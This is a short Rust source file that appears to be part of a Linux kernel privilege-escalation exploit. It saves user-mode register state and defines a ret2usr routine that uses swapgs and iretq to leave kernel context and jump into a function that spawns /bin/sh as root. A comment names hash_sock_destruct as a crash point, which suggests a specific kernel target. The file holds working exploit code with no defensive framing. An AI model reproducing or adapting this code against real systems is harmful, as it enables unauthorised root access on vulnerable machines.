use std::{ 
    arch::asm,
    process::Command
};

static mut USER_CS: u64 = 0;
static mut USER_SS: u64 = 0;
static mut USER_RFLAGS: u64 = 0;
static mut USER_SP: u64 = 0;

#[no_mangle]
#[export_name = "do_shell"]
pub extern "C" fn do_shell() {
    println!("[*] started from the $ now youre #");

    let mut shell = Command::new("/bin/sh")
        .spawn()
        .expect("[-] gtfo");

    shell.wait().expect("[-] gtfo");
    
    // todo - need to do proper fixup/cleanup to not crash in hash_sock_destruct after exiting.
}

#[naked]
#[no_mangle]
pub unsafe extern "C" fn stage_one() {
    asm!(
        "call ret2usr",
        options(noreturn)
    );
}

#[export_name = "ret2usr"]
#[no_mangle]
pub unsafe extern "C" fn ret2usr() {
    asm!(
        "swapgs",
        "mov r15, {0}", // ss
        "push r15",
        "mov r15, {1}", // rsp
        "push r15",
        "mov r15, {2}", // rflags
        "push r15",
        "mov r15, {3}", // cs
        "push r15",
        "mov r15, {4}", //  rip
        "push r15",
        "iretq",
        in(reg) USER_SS,
        in(reg) USER_SP,
        in(reg) USER_RFLAGS,
        in(reg) USER_CS,   
        in(reg) do_shell as *const () as u64,
        options(noreturn)
        );
}

pub fn save_state() {
    unsafe {
        asm!(
            "mov {}, cs",
            "mov {}, ss",
            "mov {}, rsp",
            "pushfq",
            "pop {}",
            out(reg) USER_CS,
            out(reg) USER_SS,
            out(reg) USER_SP,
            out(reg) USER_RFLAGS,
            options(nostack, nomem)
        );
    }
}